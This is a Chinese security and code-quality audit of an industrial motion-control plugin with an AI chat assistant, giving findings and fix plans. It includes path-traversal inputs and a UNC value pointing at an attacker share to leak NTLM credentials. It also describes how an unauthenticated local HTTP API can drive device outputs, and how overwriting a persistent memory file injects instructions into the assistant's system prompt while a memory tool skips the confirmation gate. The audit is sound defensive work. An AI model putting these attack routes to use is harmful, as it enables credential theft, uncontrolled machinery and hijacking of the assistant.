# TrioAI_RTSys 项目审核报告

- 审核日期：2026-11-08
- 审核范围：当前工作区全部 C# 源码（41 个 `.cs`，约 24,700 行）+ 构建脚本
- 审核维度：安全性、优雅性、硬编码、Hook/取巧手法、键盘鼠标模拟
- 审核方式：三路独立只读审核 + 关键结论人工复核
- 说明：审核期间工作区有文件被并发修改（17:21–17:30），下文的行号可能漂移；修复前请**按符号名定位**，不要只信行号。

---

## 0. 结论摘要

| 维度 | 结论 |
|---|---|
| 键盘鼠标模拟 | **无**。全仓库没有 `SendInput` / `keybd_event` / `mouse_event` / `SetCursorPos` / `SetForegroundWindow` / `SetWindowsHookEx` / `SendKeys` / UI Automation。`ShowWindow` 仅出现在测试宿主 `AbiTest`/`HostSim` 中，操作的是自建窗口。 |
| Hook / 取巧手法 | **有，且是核心实现方式**：共 12 类。最危险是 **主窗口 WndProc 子类化未可靠恢复（H1）** 与 **假 CWnd 的 vtable/stub 内存重叠（H8，确定性缺陷）**。 |
| 安全性 | 最高风险：**本机 HTTP API 完全无鉴权 + `Access-Control-Allow-Origin: *`**，任意本机进程或可访问 localhost 的网页可写工程、启停设备程序、写 VR/TABLE/IO。其次：重命名路径逃逸、`.zpj` 路径逃逸/UNC 认证泄露、请求体无上限、持久 memory 可被网页覆盖并注入系统提示词。 |
| 硬编码 | **程度高**，且集中在 ABI/UI 自动化区域（窗口偏移、RVA、消息号、控件 ID、DLL 名、MFC 修饰名、超时）。属于“明确绑死宿主版本”的高风险硬编码，部分无法避免，但应集中管理并加版本闸门。 |
| 优雅性 | 代码健康度 **4/10**。主要问题：约 4,000 行死代码/未编译副本；多个工具是“返回空但宣称成功”的伪实现；`Task.Run().GetAwaiter().GetResult()` 伪异步；静态可变缓存无锁。 |

**一句话**：项目没有恶意行为，也没有键鼠模拟；主要风险来自“为了绕过宿主无公开 API 而采用的同进程 Hook/内存扫描”和“本地 HTTP 服务没有权限边界”。建议按 P0 → P1 → P2 修复。

---

## 1. 修复优先级总表

| 级别 | 条目 | 目标 | 预计工作量 |
|---|---|---|---|
| P0 | S1-1, S1-2, S2-3, S2-4, H8, H1, S2-5, S2-6, Q3, Q5, Q2, Q7 | 消除可利用风险 + 修确定性崩溃/功能失效 | 3–5 人日 |
| P1 | Q1, Q4, Q6, Q8, Q9, Q10, Q12, Q13, Q14, Q15, Q19, S3-x | 恢复功能可信度、可维护性 | 5–7 人日 |
| P2 | Q16–Q26, S4-x | 整洁度、可移植性、性能 | 2–3 人日 |

---

## 2. P0 —— 必须先修

### [S1-1] HTTP API 无任何鉴权，CORS 全开放

- 位置：`PlugInWorker/ApiServer.cs` 的 `HandleRequestCore` 入口；`SendJson` 约 833 行；`OPTIONS` 分支约 203–212 行
- 证据：
  ```csharp
  ctx.Response.Headers.Add("Access-Control-Allow-Origin", "*");
  ctx.Response.Headers.Add("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  ctx.Response.Headers.Add("Access-Control-Allow-Headers", "Content-Type");
  ```
  全文件无 `Authorization` / `X-Auth-Token` / `Origin` / 远程地址校验。
- 影响：
  - 监听 `http://localhost:9090-9093/`，loopback 在本机所有用户/进程间共享 → 任意本机进程无凭证可调用全部 API。
  - 浏览器侧：响应带 `ACAO:*`，预检放行全部方法和 `Content-Type`；`POST /api/programs/{name}/run|stop` 用空 body 时 `HandleBody` 直接构造空字典 → HTML 表单简单 POST 无需预检即可触发。较新 Chromium 的 Private Network Access 会拦一部分，但旧内核/Firefox/内网页面不保证。
  - 若 RTSys 以管理员运行且启用 HTTP API，构成跨用户权限边界。
- 修复方向：
  1. 在 `HandleRequestCore` 最前面加统一鉴权：启动时生成随机令牌，写入仅当前用户可读的文件（或改用命名管道 ACL）；所有请求要求 `X-Auth-Token`，常量时间比较，失败 401。
  2. 校验 `Origin`：为空或白名单才放行；删除全局 `ACAO:*`。
  3. 监听地址改为 `http://127.0.0.1:port/`，新增 `/api/identity` 供客户端确认对端。
- 验证：无令牌请求全部 401；浏览器跨源请求被拒；带令牌的原有集成脚本仍可用。

### [S1-2] 高危写/设备控制端点无二次确认

- 位置：`PlugInWorker/ApiServer.cs` 路由（run/stop/VR/TABLE/IO/rename/copy/delete/source）
- 证据：
  ```csharp
  case "run": HandleBody(ctx, method, body => InvokeHandler(b => RTSysHandlers.RunProgram(name, b), body)); break;
  case "stop": HandleBody(ctx, method, body => InvokeHandler(b => RTSysHandlers.StopProgram(name, b), body)); break;
  // PUT /api/vr/{addr} -> RTSysHandlers.WriteVR -> ZMC_SetVR
  // PUT /api/io/digital/line/{n} -> ZMC_SetOutput / ZMC_SetDaOut
  ```
- 影响：这些是真实生效的写操作，不经过 ChatPanel 的人工确认。若运动程序把 VR/IO 当目标位置或使能信号，未鉴权写入可直接引起设备动作。
- 修复方向：路由分三级：read / project-write / motion-control。motion-control（run/stop、VR/TABLE、IO、drive、EtherCAT、connect）必须令牌 + UI 一次性 nonce；默认关闭，需设置中单独开启并显示警告。不建议与普通自动化 API 共用一个开关。

### [H8] 假 CWnd 的 vtable 与可执行 stub 内存重叠（确定性缺陷）

- 位置：`PlugInAdapter/PlugInHostAdapter.cs` 的 `Allocate`（约 46–70 行）
- 证据：
  ```csharp
  const int blockSize = 0x300;
  IntPtr vtable = new IntPtr(block.ToInt64() + 0x100);
  IntPtr stub   = new IntPtr(block.ToInt64() + 0x200);
  Marshal.Copy(s_nullStub, 0, stub, s_nullStub.Length);
  for (int i = 0; i < 70; i++)
      Marshal.WriteIntPtr(vtable, i * IntPtr.Size, stub);
  ```
- 影响：x86 下 vtable 从 `+0x100` 写 70×4=0x118 字节，结束于 `+0x218`；slot 64–69 的写入覆盖 `+0x200` 处的 stub 前 5 字节。宿主一旦调用 slot 69（`PreTranslateMessage`）或其它被覆盖槽位，会跳到被指针字节覆盖的垃圾指令。`AbiTest/AbiTest.cs` 复刻了同样布局，可直接复现。x64 下 70×8=0x230，更会写出 0x300 块尾。
- 修复方向（当天可做）：
  1. stub 移到 `+0x280`（或 vtable 只填到 slot 63，slot 69 单独放一块）。
  2. 加 `if (IntPtr.Size != 4) return IntPtr.Zero;`，x64 直接拒绝。
  3. 写入完成后 `VirtualProtect` 降为 `PAGE_EXECUTE_READ`。
  4. 中长期：把假 CWnd 下沉到原生 shim（C++ 真实 `CWnd`/编译器 vtable），去掉托管侧拼机器码。
- 验证：运行 `AbiTest` 的 vtable 全槽调用用例不崩。

### [H1] 主窗口 WndProc 子类化：生命周期与线程判断都有缺陷

- 位置：`PlugInWorker/RTSysProjectModel.cs` 的 `UiInvoke` / `EnsureHook` / `WndProc` / `Shutdown`
- 证据：
  ```csharp
  uint uiThread;
  GetWindowThreadProcessId(_mainHwnd, out uiThread);   // out 得到的是 PID，不是线程 ID
  if (uiThread == GetCurrentThreadId()) { action(); return; }

  _origWndProc = SetWindowLong(_mainHwnd, GWLP_WNDPROC, ptr);
  ...
  if (!_hooked) { action(); return; }                  // 钩子失败后在后台线程直接改 MFC 模型
  ```
- 影响：
  1. **线程判断永远为假**：`GetWindowThreadProcessId` 的返回值才是线程 ID，`out` 是进程 ID。当前所有调用都走子类化路径。
  2. 主窗口重建后 `_mainHwnd` 更新，但 `EnsureHook` 因 `_hooked==true` 不再挂新窗口 → 动作永远不执行；`Shutdown` 用新窗口恢复旧窗口的 WndProc → 未定义行为。
  3. `OnDispose` 在 `!_isInitialized` 时提前返回，钩子可能永久残留；宿主直接卸载时，原生窗口过程指针悬空。
  4. 子类化失败时在非 UI 线程直接执行宿主模型/原生调用，与 UI 线程并发修改 MFC 模型，可能崩溃或损坏工程数据。
  5. 跨线程 `SendMessage` 无超时，UI 线程卡住时调用线程永久阻塞。
- 修复方向：
  1. 改为 `uint tid = GetWindowThreadProcessId(hwnd, out uint pid); if (tid == GetCurrentThreadId()) ...`
  2. 记录 `_hookedHwnd`，只在原窗口恢复；检查 `SetWindowLong` 的 `GetLastError`，失败不置空委托。
  3. 窗口重建后重新挂钩；`Shutdown` 必须在提前返回之前执行；注册 `ProcessExit`/`DomainUnload` 兜底。
  4. 钩子不可用时**返回失败**，不要降级到非 UI 线程直接调用。
  5. 封送改用 `SendMessageTimeout`。
  6. 中长期：由原生 shim 建专用隐藏窗口承载消息，避免污染宿主主窗口过程。
- 验证：重复 Create/窗口重建/未初始化卸载三种场景下，宿主不崩且钩子被正确恢复。

### [S2-3] `RenameProgram` 未校验 `newName`，可逃逸工程目录

- 位置：`PlugInWorker/RTSysHandlers.cs` 的 `RenameProgram`（约 1931–1955）；`PlugInWorker/RTSysProjectModel.cs` 的 `TryRename`（约 229–267）
- 证据：
  ```csharp
  var newName = GetString(body, "newName");
  if (string.IsNullOrWhiteSpace(newName)) return Error("newName is required");
  // 没有 ValidateProgramName(newName)
  ...
  rc = _renameNative(_modelGlobal, oldStr.Ptr, newStr.Ptr);
  ```
  `TryRename` 直接 `newName + ext` 交给宿主原生改名函数。
- 影响：`"..\\..\\evil"` 或 `"C:\\tmp\\evil"` 会原样传入宿主改名函数，可能在工程目录外创建 `.bas`。`CreateProgram/WriteSource/CopyProgram` 都调用了 `ValidateProgramName`，唯独 rename 漏了。
- 修复方向：`RenameProgram` 入口加 `ValidateProgramName(newName)`；`TryRename` 再做一次规范化校验（拒绝 rooted/UNC/`..`，`Path.GetFullPath` 后必须以项目目录为前缀）。
- 验证：`newName` 为 `..\\x`、`C:\\x`、`\\\\host\\share\\x` 时全部返回错误且不落盘。

### [S2-4] `.zpj` 的 `FileN` 未限制在工程目录（路径逃逸 / UNC NTLM 泄露）

- 位置：`PlugInWorker/ProgramWorkspace.cs` 的 `ReadZpjFileList` / `ListProjectPrograms` / `ReadProjectSource`（约 175–245 行）
- 证据：
  ```csharp
  var p = Path.Combine(dir, entry.Item1);   // entry.Item1 直接来自 .zpj 的 FileN
  if (File.Exists(p)) return ReadTextAuto(p);
  ```
- 影响：打开来源不可信的 `.zpj` 后，`File1=\\attacker\share\x.bas` 会让 `list_programs`/`search_code`/`read_source`（以及每轮聊天构建环境提示词）触发 SMB 访问，泄露当前用户 NTLM；`..\\..\\secret.bas` 可读取工程目录外内容并通过 HTTP/AI 返回。
- 修复方向：新增统一函数 `ResolveInside(root, relative)`：拒绝 rooted/UNC/含 `..`；`Path.GetFullPath(Path.Combine(root, rel))` 后必须 `StartsWith(root + separator, OrdinalIgnoreCase)`。所有 `.zpj` 条目和用户输入路径都走它。

### [S2-5] HTTP 请求体无大小限制

- 位置：`PlugInWorker/ApiServer.cs` 的 `HandleBody`（约 790–799 行）
- 证据：
  ```csharp
  using (var reader = new StreamReader(ctx.Request.InputStream, ctx.Request.ContentEncoding))
      bodyText = reader.ReadToEnd();
  _requestBodySnippet = bodyText;   // ThreadStatic，线程复用期间一直持有
  ```
- 影响：`JavaScriptSerializer.MaxJsonLength` 只在反序列化阶段生效，此前已全量读入内存并再复制一份。未鉴权进程可反复发超大请求，使宿主 RTSys.exe 内存耗尽/GC 停顿。请求也不校验 `Content-Type`。
- 修复方向：读取前检查 `ContentLength64`，硬上限 2MB，超限 413；用有容量上限的读取循环；校验 `application/json`；使用独立的每次请求 serializer。

### [S2-6] 持久 memory 可被未鉴权覆盖并注入系统提示词

- 位置：`PlugInWorker/ApiServer.cs` 的 `POST /api/memory`（约 739–748 行）；`PlugInWorker/AiService.cs` 约 634–638 行；`PlugInWorker/AiMemory.cs`
- 证据：
  ```csharp
  AiService.SaveMemory(content);          // 无长度限制、无确认
  ...
  { "text", "## Persistent Memory\n\n" + memText }   // 原文进 system prompt
  ```
- 影响：任何本机进程/网页可覆盖 `memory.md`，内容在每次对话中作为高优先级指令注入，形成跨会话持久化提示词注入。`update_memory` 工具不在 `WriteTools` 集合中，**完全绕过确认门**（确认逻辑只对 `WriteTools.Contains(name)` 生效）。
- 修复方向：`/api/memory` 要求鉴权 + 显式确认，限制 32KB；把 `update_memory` 加入逐次确认集合；系统提示词中对 memory 内容加“数据非指令”边界标记。

### [Q3] RTBasic 校验索引永远为空（功能失效）

- 位置：`PlugInWorker/AiValidation.cs` 约 71、80 行；`PlugInWorker/AiSkills.cs` 约 56 行
- 证据：
  ```csharp
  // AiSkills 只产出 Lib="rtbasic"
  foreach (var lib in new[] { "rtbasic" })
  // AiValidation 却按 "triobasic" 过滤
  if (!string.Equals(entry.Lib, "triobasic", ...)) continue;
  var triobasicDir = Path.Combine(SkillsDir, "triobasic", ...);   // 实际目录是 skills/rtbasic
  ```
- 影响：`_triobasicIds` / `_signatures` 永远为空 → `POST /api/validate_basic` 把 `MOVE(`、`SPEED(` 等全部当幻觉命令报错；`lookup_command` 永远给不出签名；工具描述里的 `library="triobasic"` 也早已与实际不符。
- 修复方向：全部改为 `rtbasic`（索引过滤、目录、注释、工具 schema 描述）；加回归用例 `validate_basic("MOVE(1,2)")` 必须通过。

### [Q5] 每次 Worker 启动都删除并覆盖用户技能目录

- 位置：`PlugInWorker/AiConfig.cs` 的 `InitializeSkills`（约 216–236 行）；`PlugInWorker/Program.cs` 的 `TryInitializeSkills`（每次启动无条件调用）
- 证据：
  ```csharp
  if (Directory.Exists(dest))
      Directory.Delete(dest, true);   // 无 _skillsInitialized 判断
  CopyDirectory(dir, dest);
  ```
- 影响：用户对 `%APPDATA%\RTSysAI\skills` 的任何修改（自定义 prompt、修过的 HTML）都会在下次启动被静默清空。注释声称“已初始化过则跳过”，与实际相反。
- 修复方向：`InitializeSkills` 开头加 `if (_skillsInitialized && !force) return null;`；设置面板的“初始化 Skill 数据”按钮显式 `force:true`；或按时间戳只复制变更文件。

### [Q2] ChatPanel 有两份同名 `Palette`，主题切换写不进消息气泡

- 位置：`PlugInAdapter/ChatPanel.cs` 约 52 行（嵌套类）与约 2111 行（命名空间级类）
- 影响：`ApplyTheme()` 里的 `Palette` 解析到嵌套类，而 `RoleToBrushConverter` 读的是顶层 `Palette`。宿主切浅色主题时面板背景变了，气泡仍是深色。这是实际功能缺陷，不只是重复代码。
- 修复方向：删除嵌套类，全项目只保留文件级 `Palette`。

### [Q7] 并行工具执行 + 无锁静态缓存

- 位置：`PlugInWorker/AiSkills.cs` 的 `_index` / `_skillDetailCache`（约 36–49、400–418 行）；`PlugInWorker/AiService.cs` 并行 `Task.Run`（约 445 行）；`PlugInWorker/ApiServer.cs` 的 `TaskService`（约 57 行）
- 证据：
  ```csharp
  private static List<SkillIndexEntry> _index;                       // 无锁重建
  private static readonly Dictionary<...> _skillDetailCache = ...;   // 并行读写
  _skillDetailCache[cacheKey] = dict;
  private static AiService TaskService => _taskService ?? (_taskService = new AiService());
  ```
- 影响：同一轮多个 `lookup_command` 并行写非线程安全 `Dictionary` → 可能抛异常或破坏内部结构；HTTP `/api/tasks` 与聊天面板使用两个不同 `AiService` 实例，任务列表互不可见；静态配置被多处 `LoadConfig()` 重置。
- 修复方向：静态缓存改 `ConcurrentDictionary`/`Lazy<T>` 或加锁；`AiService` 配置统一为实例字段或不可变快照；`TaskService` 由组合根注入唯一实例。

---

## 3. P1 —— 应修

### [Q1 / S4] Adapter 侧 ApiServer / PlugInLog / DispatcherHelper 未参与编译，却是活跃的重复分叉

- 位置：`PlugInAdapter/PlugInAdapter.csproj` 的 `<Compile>` 列表（无这三个文件）；`PlugInAdapter/ApiServer.cs`
- 证据：csproj 注释写明“由 PlugInWorker 程序集提供，此处不重复编译”；但该副本仍有未提交改动，且调用只存在于已死 `Handlers.cs` 的 `GetSystemVariables`/`OpenChat`，同一 `switch` 内还有两个 `default:`（加入编译会 CS0152）。
- 影响：误导维护者与安全评估；一旦被加回编译立即失败。
- 修复方向：先合并 Adapter 副本独有的路由到 `PlugInWorker/ApiServer.cs`，然后删除三个文件；`PlugInLog`/`DispatcherHelper` 直接删。

### [Q4] 多个「控制器工具」是假实现，却正常暴露给 AI

- 位置：`PlugInWorker/ZMotionExtensions.cs`（`GetAxisCount` 固定返回 0，`GetAllAxisStatesAsync` 固定空数组，`GetSysSpecificationAsync` 只填 RawValue）；`PlugInWorker/AiTools.cs` 的 `list_axes` / `list_digital_io` / `list_analogue_io` / `get_axis_detail`
- 影响：AI 会把“读不到”误判为“控制器没有轴/没有 IO”，进而给出错误建议；prompt 还反复要求 AI 用这些工具做诊断。
- 修复方向：接真实 API（失败明确返回 `success:false`），或从 `BuildToolDefinitions`、子 agent 工具池和 prompt 中删除，只保留确实可用的只读工具。

### [Q6] 伪异步：`Safe()` 统一 `Task.Run().GetAwaiter().GetResult()`，取消无法打断

- 位置：`PlugInWorker/RTSysHandlers.cs` 的 `Safe`；`PlugInWorker/ApiServer.cs` 所有 handler；`PlugInWorker/AiTools.cs` 约 288 行 `.Result`；`PlugInAdapter/ChatPanel.cs` 约 535、1989 行 `.Result`
- 影响：每个请求占 2 个线程池线程并同步阻塞；确认框 `.Result` 等 UI 在特定路径会自锁；“停止”按钮无法打断正在阻塞的确认。
- 修复方向：`ApiServer` 改 `async Task`；`DispatchTool` 改 async 链；确认框用 `TaskCompletionSource` + `CancellationToken.Register`；删除 `Safe` 三份重载。

### [Q8] `HandleRequestCore` 566 行巨型 switch；`HandleBody` 的 `method` 参数从未使用

- 位置：`PlugInWorker/ApiServer.cs` 约 196–761、790 行
- 影响：`copy` 是唯一漏检动词的动作（`GET /api/programs/x/copy` 也会复制）；多条未匹配分支不返回 404 也不关闭响应，客户端永久挂起。
- 修复方向：路由表抽 `(method, regex, handler)` 或按资源拆分；`HandleBody` 内部校验 expectedMethod；统一 `NotFound`/`MethodNotAllowed`；`HandleRequestCore` 末尾兜底 404。

### [Q9] 程序列表合并逻辑复制 4 份，`origin` 词表不一致

- 位置：`PlugInWorker/RTSysHandlers.cs` 约 700–797、1386–1443 行
- 影响：同一程序在联网/离线返回不同 `origin`；工具描述只承诺 `local|controller|both`。新增字段要改四处。
- 修复方向：抽 `BuildProgramItems(includeController)` 统一模型；`origin` 定为常量枚举并写进工具描述。

### [Q10] `TrimHistory` 未持锁调用 `CompactHistory`（锁契约违约）

- 位置：`PlugInWorker/AiHistory.cs` 约 28–37、92、146 行；`PlugInWorker/AiService.cs` 约 294 行
- 影响：每轮开头的 `TrimHistory()` 未持 `_historyLock`，一旦触发压缩会抛 `SynchronizationLockException`（`CompactHistory` 内手工 `Monitor.Exit`）。
- 修复方向：`TrimHistory` 自己 `lock`（可重入）；`CompactHistory` 改为“取快照 → 释放锁 → 调 API → 重新加锁合并”。

### [Q12] 手写 JSON 序列化：控制字符不转义 + 数字 `ToString()` 受区域设置影响

- 位置：`PlugInWorker/AiJson.cs` 约 28–71 行
- 证据：
  ```csharp
  if (val is int || val is long || val is double ...) return val.ToString();  // 德语/法语 -> "0,5"
  return s.Replace("\\", "\\\\").Replace("\"", "\\\"")...                    // 未处理 \b \f 及 U+0000-U+001F
  ```
- 影响：区域设置会让请求 JSON 非法；源码含控制字符时同样生成非法 JSON。
- 修复方向：统一用 `JavaScriptSerializer`（或 Newtonsoft）序列化请求；若需中文不转义，用 `JsonWriter` 配置并补全控制字符与 `InvariantCulture`。

### [Q13] 子 agent prompt 列出的工具与 `SubagentToolPools` 不一致

- 位置：`PlugInWorker/AiPrompt.cs` 约 177/199/223/248/274 行 vs `PlugInWorker/AiTools.cs` 约 444–467 行
- 影响：prompt 让子 agent 使用 `get_iec_task_detail`/`read_iec_variables`/`read_sysvar` 等，但运行时白名单会拒绝 → 模型反复试错、结论不完整。
- 修复方向：以 `SubagentToolPools` 为唯一真源动态生成 prompt 的 “Tools available”；删除 IEC 相关措辞（本项目只跑 RTBasic）。

### [Q14] 上下文预算常量语义漂移

- 位置：`PlugInWorker/AiService.cs` 约 186 行；`PlugInWorker/AiHistory.cs` 约 21–35 行
- 影响：注释说 chars，代码按 tokens 比较；400K/500K 的阈值比注释意图大 4–8 倍，`TrimHistory` 基本是死阈值，长会话先撞 API 上限。
- 修复方向：统一为 tokens 命名与注释，只保留一个常量源（例如 `ContextTokenBudget = 120_000`），两处共用。

### [Q15] 配置读取/默认值重复且不一致

- 位置：`PlugInAdapter/ChatPanel.cs` 约 1732–1785 行；`PlugInWorker/AiConfig.cs` 约 184–207 行
- 影响：ChatPanel 默认 `https://api.deepseek.com/anthropic`，AiConfig 默认完整端点 `/v1/messages`；用户看到的值取决于是否打开过设置框。`SaveRTSysIp` 与 `SaveConfig` 是两次独立读-改-写，可能互相覆盖。
- 修复方向：AiConfig 暴露 `LoadConfigValue`/`SaveRTSysIp`，ChatPanel 只调用；默认 URL/模型定为 `const`。

### [Q19] 死代码簇

- 位置：`PlugInWorker/Handlers.cs`（2726 行，全仓库无引用）、`PlugInWorker/AiCompat.cs`、`PlugInAdapter/PluginRuntime.cs`、`PlugInAdapter/PlugInWorkerLauncher.cs`、`PlugInWorker/DispatcherHelper.cs`、`AiTools.cs` 中 18 个不在 schema 的 stub 分支、`RTSysHandlers.ValidateRtBasicCode` 里声明但从不使用的 `keywords` 白名单
- 影响：Worker exe 仍强制依赖 Trio DLL；死代码与有效代码同名易混淆；`RTSysHandlers.ValidateRtBasicCode` 的注释宣称完整语法检查，实际只查 3 条危险正则。
- 修复方向：删除 `Handlers.cs` + `AiCompat.cs`；未启用的预留文件加明确标记或删除；删除未用 stub 分支；校验逻辑合并到 `AiControllerValidation` 单一入口。

### [S3-x] 其他安全/健壮性项（可与其他项合并修）

1. **异常/路径泄露**：`TrySendError` 原样回显 `ex.Message`；`GET /api/plugins` 返回安装绝对路径。→ 对外只返回稳定错误码，详情写本地日志。
2. **API Key 明文落盘**：`%APPDATA%\RTSysAI\config.json` 明文 JSON，无 DPAPI、无显式 ACL；日志打印完整 URL。→ DPAPI(CurrentUser) 或 Credential Manager；强制 https；URL query 脱敏。
3. **Worker 单实例 Mutex 形同虚设**：创建了 Mutex 但从不 `WaitOne`；无父进程退出联动；`CreateNoWindow` 收不到 Ctrl+C，主线程阻塞在 `exitEvent.Wait()`，没有正常退出路径。→ `WaitOne(0)` 失败即退出；Job Object 或父进程监视；`ShutdownWorker` 显式终止。
4. **端口身份不绑定**：`Program.ResolvePort` 的结果从未传给 `ApiServer.Start()`；`Start` 静默 9090→9093 回退，launcher 却按请求端口假设。→ `Start(int preferredPort)` 真正使用参数，失败显式报错；写带 `pid+port+token` 的握手文件；客户端先校验 `/api/identity`。
5. **路由分支无默认响应**：多条未匹配路径既不 404 也不关闭响应。→ 统一兜底。
6. **Worker exe / DLL 无完整性校验**：Launcher 不校验哈希/签名；`zmotion.dll` 裸名 P/Invoke 可能被插件目录同名 DLL 抢占。→ 启动前校验哈希/签名；用完整路径加载 DLL；收紧安装目录 ACL。
7. **32/64 位假设无防护**：`ToInt32()` 截断指针、`MEMORY_BASIC_INFORMATION.RegionSize` 在 x64 下应为 `UIntPtr`。→ 入口加 `if (IntPtr.Size != 4) return false`，或改用 `IntPtr`/`SetWindowLongPtr`。
8. **共享 `JavaScriptSerializer` 实例**被多请求/并行工具共用，官方不保证线程安全。→ 每请求独立实例或加锁。

---

## 4. P2 —— 可延后

- **Q16** `--port` 参数解析后未使用；`Launcher` 按假设端口连接。接入或删除 Launcher。
- **Q17** `AiOptimizationTests.cs`（1202 行）编进生产 exe，并暴露无鉴权的 `GET /api/test`。移出生产项目，删除路由或 `#if DEBUG`。
- **Q18** `Lang` 缺键（`LightModel` 只有中文）、英文标题仍是中文、UI 大量硬编码中文与 `Lang` 混用；`DialectModeDesc` 仍提 TrioBASIC/IEC。→ 启动期自检缺键；剩余中文迁入 `Lang`。
- **Q20** `RTSysProjectModel` 裸字面量（`IDYES=6`、`60/100/200`、`512`、`64`、TTL 3s、DLL/导出名）；`_candidates` 锁外遍历；扫描整块 ≤64MB 分配。→ 提常量、加锁/快照、限定扫描范围。
- **Q21** `ProgramWorkspace` 每次操作重解析 `.zpj`；`936`、`.bas`、`[FileList]` 等格式常量散落。→ `ZpjFormat`/`ZpjReader` + 短缓存 + `ProjectEncoding` 常量。
- **Q22** `ChatPanel.BuildUI` 357 行、`OnSettings` 341 行；尺寸/边距裸值；两处会话解析重复。→ 控件工厂 + `UiMetrics`；复用 `LoadSessionMessages`。
- **Q23** 构建脚本硬编码 `%USERPROFILE%\Desktop\RTSys`；`build_shim_cl.bat` 与 `build_shim.bat` 重复。→ `%~dp0` 派生 + 环境变量覆盖；`vswhere` 定位；删重复脚本。
- **Q24** ZMotion：`ConnectAsync` 的 `type` 参数未使用；`numFractionDigits` 未使用；`ParseCODataType` 默认值注释错误（7=uint32，uint16=5）；`ZMC_SearchEth` 超时后线程仍阻塞。→ 删除无效参数或真正使用；修正默认值；给搜索明确超时。
- **Q25** `RTSysHandlers.ValidateRtBasicCode` 的关键字白名单声明后从不使用，注释宣称的语法检查不存在。→ 删除或并入统一校验入口。
- **Q26** `AiTools` 结果序列化两次；`LogException` 格式串把 message 打印两遍；未使用的 using/空订阅方法。→ 清理。
- **S4** `StringBuilder` 无长度参数 P/Invoke 依赖第三方 DLL 不越界；`ApiServer.Start` 失败时未释放候选 `HttpListener`。→ 改 `IntPtr`+显式容量；失败时 `Close()`。

---

## 5. 「无法完全避免」但必须设边界

以下是同进程插件、宿主无公开托管 API 时的现实约束，不建议强行移除，但必须加闸门：

1. `GetProcAddress` 修饰名调用（BCG `SelectItem`）、按 RVA 直调宿主内部函数、`[pHost+0x20]` 偏移读取。
   - 保留 SHA-256 + 函数序言双重校验；校验失败必须回退文件级路径，不能“继续试”。
   - 把偏移/RVA/DLL/修饰名/控件 ID/超时统一收敛到单一 `HostAbi` 表，并按宿主版本绑定。
2. 内存扫描定位 `CFileView`。
   - 默认改用 `ProgramWorkspace` 的文件级实现；内存模型做成显式开关 + 强制版本校验。
   - 扫描结果不能作为删除/改名的唯一依据。
3. `PlugIn_Create` 必须返回 `CWnd*`。
   - 正确做法是下沉到原生 shim 用真实 `CWnd`；托管侧假对象只能作为临时方案，且必须修 H8。
4. 对话框自动应答。
   - 立刻删除“文本关键字猜测 + 盲点按钮 ID 6”；改为按本次操作产生的对话框精确匹配控件 ID，匹配不到就返回“需要人工处理”。

## 6. 明确不是问题

- 键鼠模拟：不存在。
- `ZMotionAPI.cs` 的 `DllName`/`EntryPoint="ZMC_*"`、`ZMotionErrors` 错误码、`RTSysEditor` 的 Scintilla 消息号、`PlugInAbi` 的结构布局、`RTSysProjectModel` 的偏移/RVA/SHA-256：均属具名常量或必须的版本锁定，不算坏硬编码。
- `AbiTest`/`HostSim` 中的 `ShowWindow`/`CreateWindowEx`：测试宿主操作自建窗口，不是模拟用户输入。

---

## 7. 修复执行约束

1. 先做 P0 的“低风险高收益”四项：统一令牌鉴权、路径沙箱函数、请求体上限、H8 偏移修正。不需要改业务流程。
2. 每项修复都要能独立验证；优先补回归用例：
   - 无令牌请求 → 401
   - `newName` / `.zpj` 逃逸 → 拒绝
   - `validate_basic("MOVE(1,2)")` → 通过
   - `AbiTest` vtable 全槽调用 → 不崩
   - 重复 Create / 窗口重建 / 未初始化卸载 → 钩子正确恢复
3. 不要顺手重构周边代码；不要删除历史遗留代码除非该项明确要求。
4. 构建验证：`build_deploy.bat`；回归：`RegressionTest.csproj` / `RegressionTestMain.cs`。
5. 当前工作区有其他会话在并发修改 `ChatPanel.cs`、`ApiServer.cs`、`RTSysProjectModel.cs` 等文件。修复前先 `git status` / 看 mtime，确认没有覆盖他人未提交改动。
